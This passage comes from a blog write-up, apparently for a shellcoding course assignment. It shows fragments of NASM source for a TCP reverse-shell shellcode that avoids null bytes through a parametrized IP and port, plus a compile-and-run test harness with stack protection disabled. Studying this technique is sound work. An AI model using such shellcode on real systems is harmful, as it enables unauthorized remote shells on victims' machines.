<p>And have a look at the result shell_reverse_tcp.nasm file:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">...</span>
    <span class="nf">push</span> <span class="nb">edx</span>
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="mh">0x7f</span>    <span class="c1">; useful to avoid null bytes with parametrized IP</span>
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span> <span class="nb">dl</span>  <span class="c1">; If 00 will be replaced by dl</span>
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span> <span class="nb">dl</span>     
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">3</span><span class="p">],</span> <span class="mh">0x1</span>

    <span class="nf">push</span> <span class="nb">dx</span>                  <span class="c1">; useful to avoid null bytes with parametrized port</span>
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span><span class="p">],</span> <span class="mh">0x08</span>    <span class="c1">; mysockaddr.sin_port = htons(dstport); //8080</span>
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span> <span class="nb">dl</span> 
<span class="nf">...</span>
</code></pre></div></div>

<p>We are pushing the <em>dl</em> byte register in replacement of a null byte.</p>

<p>So now let’s confirm that the generated nasm source file leads to a working shellcode once compiled thanks to <a href="https://github.com/phackt/slae/tree/master/assignment2/shellcode.c">shellcode.c</a>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># gcc -fno-stack-protector -z execstack -o shellcode shellcode.c &amp;&amp; ./shellcode </span>
Shellcode Length: 106

</code></pre></div></div>

<p>And here we are:<br />
<img src="http://localhost:4000/public/images/slae/assignment2/image2.png" alt="image2" /></p>

<p>So now we can parametrize the port number, the IP address, and you can generate a TCP reverse shellcode without any null bytes.</p>

<p>Hope you enjoyed,<br />
Don’t hesitate to comment and share.</p>

<p><a href="https://twitter.com/phackt_ul">Phackt</a></p>

:ET